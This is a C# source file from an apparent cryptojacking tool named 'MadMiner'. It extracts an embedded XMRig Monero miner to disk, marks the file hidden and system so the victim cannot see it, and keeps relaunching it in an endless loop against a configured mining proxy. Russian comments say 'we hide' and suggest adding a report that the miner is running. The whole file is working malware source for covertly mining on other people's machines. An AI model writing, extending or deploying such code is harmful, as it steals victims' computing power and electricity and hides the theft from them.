using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Threading;

namespace MadMiner.Miner
{
    class XMRIG
    {
        [STAThread]
        public static void Run() // Monero.Run()
        {
            while (true)
            {
                Process[] pname = Process.GetProcessesByName(Settings.xmrProc);
                if (pname.Length == 0)
                {
                    // Проверяем наличие файла XMRIG Если нету то извлекаем
                    if (!File.Exists(Settings.xmrBin))
                    {

                        File.WriteAllBytes(Settings.xmrBin, Properties.Resources.XMRIG);

                        // Скрываемся
                        File.SetAttributes(Settings.xmrBin, FileAttributes.Hidden | FileAttributes.System);

                        Thread.Sleep(2000);
                        GetMiner();
                    }
                    else
                    {
                        GetMiner();
                    }
                }
                else
                {
                    Thread.Sleep(2000);
                }

                Thread.Sleep(2000);
            }
        }



        static void GetMiner()
        {
            /* Запуск майнера через cmd */
            Process process = new Process();
            process.StartInfo.CreateNoWindow = false;
            process.StartInfo.UseShellExecute = false;
            process.StartInfo.Arguments = "--url " + Settings.xmrProxy + " --donate-level 1";
            process.StartInfo.FileName = Settings.xmrBin;
            process.Start();


            new Thread(() =>
            {
                Thread.Sleep(120000);
                Process[] pname = Process.GetProcessesByName(Settings.xmrProc);
                if (pname.Length == 0)
                {

                }
                else
                {
                    // Выполняем если майнинг включен уже 2 минуты! Можно прикрутить например отчет что майнер работает.
                }

            }).Start();

        }
    }
}
